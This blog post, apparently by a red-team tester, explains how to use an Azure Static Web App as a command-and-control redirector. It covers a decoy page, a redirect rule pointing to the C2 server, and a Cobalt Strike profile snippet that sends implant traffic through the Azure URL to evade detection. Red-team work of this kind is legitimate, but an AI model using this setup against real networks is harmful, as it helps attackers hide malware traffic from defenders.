# Transforming Azure Static Web Applications into C2 Redirectors:

## Creative C2 Redirection:

This year, I have challenged myself to engineer creative solutions for command-and-control (C2) server redirection. A redirector is a server that sits between your malware controller and the target network. When conducting an engagement, it's crucial to protect offensive infrastructure from detection by defenders. Leveraging cloud features to make  network traffic look legitimate aids in evading intrusion detection systems and can lead to successful completion of offensive operations.

My introduction to developing redirectors started with a basic Apache web server passing HTTP and HTTPS traffic to C2 servers utilizing `mod_rewrite`, a way to conditionally redirect requests to another URL on the fly. However, seeking a stealthier approach, I utilized AWS's Content Delivery Network (CDN) known as CloudFront. By leveraging Amazon's valid certificates and the fact that each domain was allow-listed within the organization, I achieved the desired result: stealth. This began my journey to discovering other methods of masking and redirection to bypass and evade defensive controls.

I was aware that Azure provided similar CDN features, but this approach required a valid domain origin for redirection. What if a down-and-dirty pentester wanted to redirect to a static IP address? That's when I dove into the world of Azure static web applications. 

---

## Creating Static Web Applications:

To create a static web application in Azure, simply navigate to the Azure Portal, select _Create a Resource_, search for _Static Web App_, and create!

![Static Web Application Creation](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5idppjxu7eyj9e60uoeo.png)

---

## Building the Static Web Application Code:

Before configuring your static web application, you will need to create a GitHub repository to host the code. I simply named mine _StaticWebRedirector_ and created two files in the repository. The first is the HTML index file that will be referenced if the target is not redirected. To safeguard offensive infrastructure from effective defenders and web crawlers, it is crucial to establish criteria for redirection. This can involve specifying a particular URL that the targeted device is attempting to access or defining a specific User-Agent string as conditions for the redirection process. Within your `index.html` file, create a legitimate-looking site to not raise suspicion if the website is crawled or accessed by network defenders. Secondly, create a separate file named `staticwebapp.config.json` and add the following code to it.  

![Redirection Code](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7p418chzp68vo1l2nnwy.png)

The `staticwebapp.config.json` configuration file defines a _route_, which is the accessed URL for redirection. In the example above, all requests accessing any path within the root of the site will be redirected to the IP address of the C2 server. This redirection occurs via a HTTP 301, which is used to indicate a permanent redirection of a web page or resource. Subsequent requests from the client for the original URL will be automatically redirected to the new URL without the client's involvement. To protect the C2 infrastructure, implement a specific path of the URL that will redirect so that the server will not pass all traffic through, but rather, implement conditions.

---

## Configuring the Web Application:

To configure the Azure static web application, you need to provide details like the subscription, resource group, name, region, and source code repository. You will also be required to authenticate to the GitHub account of the repository where the code is hosted. In addition, you have the option to configure the build settings, such as using build presets or specifying a custom build command if required. I did not utilize any of these features, but they are available. Finally, you can click on "Review + Create" to review all the provided settings and then click "Create" to initiate the creation of the static web app redirector.


![Configuring Static Web App](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1t04d7r7hd97zwld2gyf.png)

---

## Customizing the C2 Profile:

To effectively utilize this technique, your malware, implants, and payloads need to call back to the web application's URL. For example, if you are using Cobalt Strike, copy the `azurestaticapp` URL into your malleable profile. The URL can be found on the redirector's _Overview_ tab.

![Azure URL](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/s70c2x222vgaatee0er0.png)

Once you have identified the URL, you can add this to your profile. Below is an example from threatexpress' jquery-c2.4.7 profile:

```
http-get {

    set uri "/api/v1";
    set verb "GET";

    client {

        header "Accept" "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
        header "Host" "calm-cliff-0a3428310.3.azurestaticapps.net";
        header "Referer" "http://code.jquery.com/";
        header "Accept-Encoding" "gzip, deflate";

        metadata {
            base64url;
            prepend "__cfduid=";
            header "Cookie";
        }
    }
```

Compile your payloads and launch away! 

---

I hope this simple demonstration was useful and you learned something new. There are many creative ways to evade defensive controls, and if you would like to learn more, feel free to check out my GitHub at: https://github.com/RoseSecurity
